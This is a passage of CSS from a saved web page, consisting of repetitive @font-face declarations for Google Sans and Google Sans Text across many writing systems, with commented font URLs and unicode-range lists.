                    url() format("woff2");
                unicode-range: U+0307-0308, U+0590-05FF, U+200C-2010, U+20AA, U+25CC, U+FB1D-FB4F;
            }
            /* khmer */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPjkUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+1780-17FF, U+19E0-19FF, U+200C-200D, U+25CC;
            }
            /* lao */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPjsUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0E81-0EDF, U+200C-200D, U+25CC;
            }
            /* malayalam */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPioUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0307, U+0323, U+0951-0952, U+0964-0965, U+0D00-0D7F, U+1CDA, U+1CF2, U+200C-200D,
                    U+20B9, U+25CC, U+A830-A832;
            }
            /* oriya */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPisUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0B01-0B77, U+1CDA, U+1CF2, U+200C-200D, U+20B9, U+25CC;
            }
            /* sinhala */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPi8UvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0964-0965, U+0D81-0DF4, U+1CF2, U+200C-200D, U+25CC, U+111E1-111F4;
            }
            /* symbols */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPlwUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0001-000C, U+000E-001F, U+007F-009F, U+20DD-20E0, U+20E2-20E4, U+2150-218F, U+2190,
                    U+2192, U+2194-2199, U+21AF, U+21E6-21F0, U+21F3, U+2218-2219, U+2299, U+22C4-22C6, U+2300-243F,
                    U+2440-244A, U+2460-24FF, U+25A0-27BF, U+2800-28FF, U+2921-2922, U+2981, U+29BF, U+29EB, U+2B00-2BFF,
                    U+4DC0-4DFF, U+FFF9-FFFB, U+10140-1018E, U+10190-1019C, U+101A0, U+101D0-101FD, U+102E0-102FB,
                    U+10E60-10E7E, U+1D2C0-1D2D3, U+1D2E0-1D37F, U+1F000-1F0FF, U+1F100-1F1AD, U+1F1E6-1F1FF,
                    U+1F30D-1F30F, U+1F315, U+1F31C, U+1F31E, U+1F320-1F32C, U+1F336, U+1F378, U+1F37D, U+1F382,
                    U+1F393-1F39F, U+1F3A7-1F3A8, U+1F3AC-1F3AF, U+1F3C2, U+1F3C4-1F3C6, U+1F3CA-1F3CE, U+1F3D4-1F3E0,
                    U+1F3ED, U+1F3F1-1F3F3, U+1F3F5-1F3F7, U+1F408, U+1F415, U+1F41F, U+1F426, U+1F43F, U+1F441-1F442,
                    U+1F444, U+1F446-1F449, U+1F44C-1F44E, U+1F453, U+1F46A, U+1F47D, U+1F4A3, U+1F4B0, U+1F4B3, U+1F4B9,
                    U+1F4BB, U+1F4BF, U+1F4C8-1F4CB, U+1F4D6, U+1F4DA, U+1F4DF, U+1F4E3-1F4E6, U+1F4EA-1F4ED, U+1F4F7,
                    U+1F4F9-1F4FB, U+1F4FD-1F4FE, U+1F503, U+1F507-1F50B, U+1F50D, U+1F512-1F513, U+1F53E-1F54A,
                    U+1F54F-1F5FA, U+1F610, U+1F650-1F67F, U+1F687, U+1F68D, U+1F691, U+1F694, U+1F698, U+1F6AD, U+1F6B2,
                    U+1F6B9-1F6BA, U+1F6BC, U+1F6C6-1F6CF, U+1F6D3-1F6D7, U+1F6E0-1F6EA, U+1F6F0-1F6F3, U+1F6F7-1F6FC,
                    U+1F700-1F7FF, U+1F800-1F80B, U+1F810-1F847, U+1F850-1F859, U+1F860-1F887, U+1F890-1F8AD,
                    U+1F8B0-1F8BB, U+1F8C0-1F8C1, U+1F900-1F90B, U+1F93B, U+1F946, U+1F984, U+1F996, U+1F9E9,
                    U+1FA00-1FA6F, U+1FA70-1FA7C, U+1FA80-1FA89, U+1FA8F-1FAC6, U+1FACE-1FADC, U+1FADF-1FAE9,
                    U+1FAF0-1FAF8, U+1FB00-1FBFF;
            }
            /* tamil */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPiQUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0964-0965, U+0B82-0BFA, U+200C-200D, U+20B9, U+25CC;
            }
            /* telugu */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPi4UvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0C00-0C7F, U+1CDA, U+1CF2, U+200C-200D, U+25CC;
            }
            /* thai */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPiYUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+02D7, U+0303, U+0331, U+0E01-0E5B, U+200C-200D, U+25CC;
            }
            /* vietnamese */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPj0UvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301,
                    U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
            }
            /* latin-ext */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPjwUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329,
                    U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F,
                    U+A720-A7FF;
            }
            /* latin */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 500;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPjIUvQ.woff2*/
                    url() format("woff2");
                unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308,
                    U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
            }
            /* armenian */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPiIUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0308, U+0530-058F, U+2010, U+2024, U+25CC, U+FB13-FB17;
            }
            /* bengali */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPiAUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0980-09FE, U+1CD0, U+1CD2, U+1CD5-1CD6, U+1CD8, U+1CE1,
                    U+1CEA, U+1CED, U+1CF2, U+1CF5-1CF7, U+200C-200D, U+20B9, U+25CC, U+A8F1;
            }
            /* canadian-aboriginal */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPh0UvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+02C7, U+02D8-02D9, U+02DB, U+0307, U+1400-167F, U+18B0-18F5, U+25CC, U+11AB0-11ABF;
            }
            /* cyrillic-ext */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPj8UvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
            }
            /* cyrillic */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPjYUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
            }
            /* devanagari */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPjMUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0900-097F, U+1CD0-1CF9, U+200C-200D, U+20A8, U+20B9, U+20F0, U+25CC, U+A830-A839,
                    U+A8E0-A8FF, U+11B00-11B09;
            }
            /* ethiopic */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPiMUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+030E, U+1200-1399, U+2D80-2DDE, U+AB01-AB2E, U+1E7E0-1E7E6, U+1E7E8-1E7EB,
                    U+1E7ED-1E7EE, U+1E7F0-1E7FE;
            }
            /* georgian */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPi0UvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0589, U+10A0-10FF, U+1C90-1CBA, U+1CBD-1CBF, U+205A, U+2D00-2D2F, U+2E31;
            }
            /* greek-ext */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPj4UvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+1F00-1FFF;
            }
            /* greek */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPjEUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0370-0377, U+037A-037F, U+0384-038A, U+038C, U+038E-03A1, U+03A3-03FF;
            }
            /* gujarati */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPikUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0A80-0AFF, U+200C-200D, U+20B9, U+25CC, U+A830-A839;
            }
            /* gurmukhi */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPhEUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0A01-0A76, U+200C-200D, U+20B9, U+25CC, U+262C, U+A830-A839;
            }
            /* hebrew */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPjAUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0307-0308, U+0590-05FF, U+200C-2010, U+20AA, U+25CC, U+FB1D-FB4F;
            }
            /* khmer */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPjkUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+1780-17FF, U+19E0-19FF, U+200C-200D, U+25CC;
            }
            /* lao */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPjsUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0E81-0EDF, U+200C-200D, U+25CC;
            }
            /* malayalam */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPioUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0307, U+0323, U+0951-0952, U+0964-0965, U+0D00-0D7F, U+1CDA, U+1CF2, U+200C-200D,
                    U+20B9, U+25CC, U+A830-A832;
            }
            /* oriya */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPisUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0B01-0B77, U+1CDA, U+1CF2, U+200C-200D, U+20B9, U+25CC;
            }
            /* sinhala */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPi8UvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0964-0965, U+0D81-0DF4, U+1CF2, U+200C-200D, U+25CC, U+111E1-111F4;
            }
            /* symbols */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPlwUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0001-000C, U+000E-001F, U+007F-009F, U+20DD-20E0, U+20E2-20E4, U+2150-218F, U+2190,
                    U+2192, U+2194-2199, U+21AF, U+21E6-21F0, U+21F3, U+2218-2219, U+2299, U+22C4-22C6, U+2300-243F,
                    U+2440-244A, U+2460-24FF, U+25A0-27BF, U+2800-28FF, U+2921-2922, U+2981, U+29BF, U+29EB, U+2B00-2BFF,
                    U+4DC0-4DFF, U+FFF9-FFFB, U+10140-1018E, U+10190-1019C, U+101A0, U+101D0-101FD, U+102E0-102FB,
                    U+10E60-10E7E, U+1D2C0-1D2D3, U+1D2E0-1D37F, U+1F000-1F0FF, U+1F100-1F1AD, U+1F1E6-1F1FF,
                    U+1F30D-1F30F, U+1F315, U+1F31C, U+1F31E, U+1F320-1F32C, U+1F336, U+1F378, U+1F37D, U+1F382,
                    U+1F393-1F39F, U+1F3A7-1F3A8, U+1F3AC-1F3AF, U+1F3C2, U+1F3C4-1F3C6, U+1F3CA-1F3CE, U+1F3D4-1F3E0,
                    U+1F3ED, U+1F3F1-1F3F3, U+1F3F5-1F3F7, U+1F408, U+1F415, U+1F41F, U+1F426, U+1F43F, U+1F441-1F442,
                    U+1F444, U+1F446-1F449, U+1F44C-1F44E, U+1F453, U+1F46A, U+1F47D, U+1F4A3, U+1F4B0, U+1F4B3, U+1F4B9,
                    U+1F4BB, U+1F4BF, U+1F4C8-1F4CB, U+1F4D6, U+1F4DA, U+1F4DF, U+1F4E3-1F4E6, U+1F4EA-1F4ED, U+1F4F7,
                    U+1F4F9-1F4FB, U+1F4FD-1F4FE, U+1F503, U+1F507-1F50B, U+1F50D, U+1F512-1F513, U+1F53E-1F54A,
                    U+1F54F-1F5FA, U+1F610, U+1F650-1F67F, U+1F687, U+1F68D, U+1F691, U+1F694, U+1F698, U+1F6AD, U+1F6B2,
                    U+1F6B9-1F6BA, U+1F6BC, U+1F6C6-1F6CF, U+1F6D3-1F6D7, U+1F6E0-1F6EA, U+1F6F0-1F6F3, U+1F6F7-1F6FC,
                    U+1F700-1F7FF, U+1F800-1F80B, U+1F810-1F847, U+1F850-1F859, U+1F860-1F887, U+1F890-1F8AD,
                    U+1F8B0-1F8BB, U+1F8C0-1F8C1, U+1F900-1F90B, U+1F93B, U+1F946, U+1F984, U+1F996, U+1F9E9,
                    U+1FA00-1FA6F, U+1FA70-1FA7C, U+1FA80-1FA89, U+1FA8F-1FAC6, U+1FACE-1FADC, U+1FADF-1FAE9,
                    U+1FAF0-1FAF8, U+1FB00-1FBFF;
            }
            /* tamil */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPiQUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0964-0965, U+0B82-0BFA, U+200C-200D, U+20B9, U+25CC;
            }
            /* telugu */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPi4UvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0C00-0C7F, U+1CDA, U+1CF2, U+200C-200D, U+25CC;
            }
            /* thai */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPiYUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+02D7, U+0303, U+0331, U+0E01-0E5B, U+200C-200D, U+25CC;
            }
            /* vietnamese */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPj0UvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+0300-0301,
                    U+0303-0304, U+0308-0309, U+0323, U+0329, U+1EA0-1EF9, U+20AB;
            }
            /* latin-ext */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPjwUvaYr.woff2*/
                    url() format("woff2");
                unicode-range: U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329,
                    U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F,
                    U+A720-A7FF;
            }
            /* latin */
            @font-face {
                font-family: "Google Sans";
                font-style: normal;
                font-weight: 700;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesans/v65/4UasrENHsxJlGDuGo1OIlJfC6l_24rlCK1Yo_Iqcsih3SAyH6cAwhX9RPjIUvQ.woff2*/
                    url() format("woff2");
                unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308,
                    U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
            }
            /* armenian */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUu9-KzpRiLCAt4Unrc-xIKmCU5qFp2i1dC.woff2*/
                    url() format("woff2");
                unicode-range: U+0308, U+0530-058F, U+2010, U+2024, U+25CC, U+FB13-FB17;
            }
            /* bengali */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUu9-KzpRiLCAt4Unrc-xIKmCU5qFh2i1dC.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0980-09FE, U+1CD0, U+1CD2, U+1CD5-1CD6, U+1CD8, U+1CE1,
                    U+1CEA, U+1CED, U+1CF2, U+1CF5-1CF7, U+200C-200D, U+20B9, U+25CC, U+A8F1;
            }
            /* canadian-aboriginal */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUu9-KzpRiLCAt4Unrc-xIKmCU5qGV2i1dC.woff2*/
                    url() format("woff2");
                unicode-range: U+02C7, U+02D8-02D9, U+02DB, U+0307, U+1400-167F, U+18B0-18F5, U+25CC, U+11AB0-11ABF;
            }
            /* cyrillic-ext */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUu9-KzpRiLCAt4Unrc-xIKmCU5qEd2i1dC.woff2*/
                    url() format("woff2");
                unicode-range: U+0460-052F, U+1C80-1C8A, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
            }
            /* cyrillic */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUu9-KzpRiLCAt4Unrc-xIKmCU5qE52i1dC.woff2*/
                    url() format("woff2");
                unicode-range: U+0301, U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
            }
            /* devanagari */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUu9-KzpRiLCAt4Unrc-xIKmCU5qEt2i1dC.woff2*/
                    url() format("woff2");
                unicode-range: U+0900-097F, U+1CD0-1CF9, U+200C-200D, U+20A8, U+20B9, U+20F0, U+25CC, U+A830-A839,
                    U+A8E0-A8FF, U+11B00-11B09;
            }
            /* ethiopic */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUu9-KzpRiLCAt4Unrc-xIKmCU5qFt2i1dC.woff2*/
                    url() format("woff2");
                unicode-range: U+030E, U+1200-1399, U+2D80-2DDE, U+AB01-AB2E, U+1E7E0-1E7E6, U+1E7E8-1E7EB,
                    U+1E7ED-1E7EE, U+1E7F0-1E7FE;
            }
            /* georgian */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUu9-KzpRiLCAt4Unrc-xIKmCU5qFV2i1dC.woff2*/
                    url() format("woff2");
                unicode-range: U+0589, U+10A0-10FF, U+1C90-1CBA, U+1CBD-1CBF, U+205A, U+2D00-2D2F, U+2E31;
            }
            /* greek-ext */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUu9-KzpRiLCAt4Unrc-xIKmCU5qEZ2i1dC.woff2*/
                    url() format("woff2");
                unicode-range: U+1F00-1FFF;
            }
            /* greek */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUu9-KzpRiLCAt4Unrc-xIKmCU5qEl2i1dC.woff2*/
                    url() format("woff2");
                unicode-range: U+0370-0377, U+037A-037F, U+0384-038A, U+038C, U+038E-03A1, U+03A3-03FF;
            }
            /* gujarati */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUu9-KzpRiLCAt4Unrc-xIKmCU5qFF2i1dC.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0A80-0AFF, U+200C-200D, U+20B9, U+25CC, U+A830-A839;
            }
            /* gurmukhi */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUu9-KzpRiLCAt4Unrc-xIKmCU5qGl2i1dC.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0A01-0A76, U+200C-200D, U+20B9, U+25CC, U+262C, U+A830-A839;
            }
            /* hebrew */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUu9-KzpRiLCAt4Unrc-xIKmCU5qEh2i1dC.woff2*/
                    url() format("woff2");
                unicode-range: U+0307-0308, U+0590-05FF, U+200C-2010, U+20AA, U+25CC, U+FB1D-FB4F;
            }
            /* kannada */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUu9-KzpRiLCAt4Unrc-xIKmCU5qFB2i1dC.woff2*/
                    url() format("woff2");
                unicode-range: U+0951-0952, U+0964-0965, U+0C80-0CF3, U+1CD0, U+1CD2-1CD3, U+1CDA, U+1CF2, U+1CF4,
                    U+200C-200D, U+20B9, U+25CC, U+A830-A835;
            }
            /* khmer */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUu9-KzpRiLCAt4Unrc-xIKmCU5qEF2i1dC.woff2*/
                    url() format("woff2");
                unicode-range: U+1780-17FF, U+19E0-19FF, U+200C-200D, U+25CC;
            }
            /* lao */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUu9-KzpRiLCAt4Unrc-xIKmCU5qEN2i1dC.woff2*/
                    url() format("woff2");
                unicode-range: U+0E81-0EDF, U+200C-200D, U+25CC;
            }
            /* malayalam */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 400;
                src: /*savepage-url=https://fonts.gstatic.com/s/googlesanstext/v24/5aUu9-KzpRiLCAt4Unrc-xIKmCU5qFJ2i1dC.woff2*/
                    url() format("woff2");
                unicode-range: U+0307, U+0323, U+0951-0952, U+0964-0965, U+0D00-0D7F, U+1CDA, U+1CF2, U+200C-200D,
                    U+20B9, U+25CC, U+A830-A832;
            }
            /* oriya */
            @font-face {
                font-family: "Google Sans Text";
                font-style: normal;
                font-weight: 400;
